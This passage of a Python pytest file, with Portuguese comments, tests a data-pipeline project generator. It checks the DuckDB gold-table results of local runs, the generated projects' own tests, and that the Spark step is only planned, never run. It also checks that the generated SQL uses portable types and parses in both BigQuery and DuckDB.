    argv = ["run", "local", "--config", str(root / "config/pipeline.yaml"), "--run-id", RUN]
    for _ in range(2):
        assert cli.main(argv) == 0
        assert _query(root, "SELECT count(*) FROM silver.registros_arquivo") == [(5,)]
        assert _query(root, "SELECT nome, qtd, total FROM gold.resumo_por_nome ORDER BY nome") == [
            ("Alfa", 1, Decimal("10.50")),
            ("Beta", 1, Decimal("20.00")),
            ("Delta", 1, Decimal("3.10")),
            ("Epsilon", 1, Decimal("99.99")),
            ("Gama", 1, Decimal("7.25")),
        ]
        assert _query(root, "SELECT nome, classe FROM gold.agregado_classificado ORDER BY nome") == [
            ("Alfa", "baixo"),
            ("Beta", "baixo"),
            ("Delta", "baixo"),
            ("Epsilon", "alto"),
            ("Gama", "baixo"),
        ]
    assert _query(root, "SELECT count(*) FROM gold.agregado_por_nome") == [(5,)]


@pytest.mark.parametrize(
    "contexto",
    [
        {"tipo_projeto": "relatorio"},
        {"tipo_projeto": "relatorio", "usa_python": "sim", "usa_spark": "sim"},
        {"tipo_projeto": "hibrido", "usa_python": "sim"},
        {"tipo_projeto": "hibrido", "origens": "pubsub", "modo_carga": "merge", "usa_spark": "sim"},
    ],
    ids=["relatorio", "relatorio-py-spark", "hibrido-arquivo-py", "hibrido-pubsub-spark"],
)
def test_generated_report_projects_own_tests_pass(bake: Bake, contexto: dict[str, str]) -> None:
    """Os testes do projeto gerado passam; com spark, a execução local deixa de fora só a etapa `spark`."""
    root = bake(**contexto)
    proc = _run_project_tests(root)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "skipped" not in proc.stdout and "failed" not in proc.stdout


def test_spark_step_is_only_validated_and_planned_not_run(bake: Bake) -> None:
    """Spark nunca roda aqui: o projeto só é validado/planejado e o script é Python válido."""
    root = bake(tipo_projeto="relatorio", usa_spark="sim")
    _validate_and_plan(root)
    ast.parse((root / "spark/recalcula.py").read_text(encoding="utf-8"))
    spark = next(t for t in _plan_dag(root) if t.task_id == "recalcula_spark")
    assert spark.kind == "dataproc_batch"
    assert spark.command[:4] == ["python", "spark/recalcula.py", "--etapa", "recalcula_spark"]
    text = (root / "config/pipeline.yaml").read_text(encoding="utf-8")
    assert text.index("id: checagem_final") < text.index("id: recalcula_spark")  # spark por último


# ---------------------------------------------------------------------------------------------------------------
# SQL portátil: o mesmo .sql roda no DuckDB (local) e no BigQuery
# ---------------------------------------------------------------------------------------------------------------
NON_PORTABLE_TYPES = re.compile(r"\b(VARCHAR|TIMESTAMPTZ|BIGINT|INTEGER|TEXT|DOUBLE|FLOAT8|INT4|INT8)\b", re.IGNORECASE)
SQL_SAMPLES = [
    {"tipo_projeto": "ingestao", "origens": "arquivo,api,pubsub"},
    {"tipo_projeto": "relatorio", "usa_python": "sim"},
    {"tipo_projeto": "hibrido", "origens": "arquivo,api,pubsub", "usa_spark": "sim"},
]


@pytest.fixture
def sql_files(bake: Bake) -> list[Path]:
    files = []
    for i, contexto in enumerate(SQL_SAMPLES):
        root = bake(nome_projeto=f"sql{i}", **contexto)
        files += sorted((root / "sql").rglob("*.sql"))
    assert len(files) >= 12
    return files


def test_generated_sql_uses_only_portable_type_names(sql_files: list[Path]) -> None:
    """Tipos como VARCHAR/TIMESTAMPTZ existem no DuckDB mas não no BigQuery (o validate-config só checa a sintaxe)."""
    found = []
    for path in sql_files:
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
            code = line.split("--", 1)[0]
            found += [f"{path.parent.parent.parent.name}/{path.relative_to(path.parent.parent.parent).as_posix()}:{number}: {m.group(0)}" for m in NON_PORTABLE_TYPES.finditer(code)]
    assert not found, "tipos não portáteis (use STRING, INT64, TIMESTAMP, DECIMAL(p, s), DATE):\n" + "\n".join(found)


@pytest.mark.parametrize("dialect", ["bigquery", "duckdb"])
def test_generated_sql_parses_in_bigquery_and_duckdb(sql_files: list[Path], dialect: str) -> None:
    for path in sql_files:
        text = re.sub(r"\$\{[a-z_]+\}", "x", path.read_text(encoding="utf-8"))
        try:
            assert sqlglot.parse(text, read=dialect)
        except sqlglot.errors.SqlglotError as exc:
            pytest.fail(f"{path.name} não é SQL válido no dialeto {dialect}: {exc}")
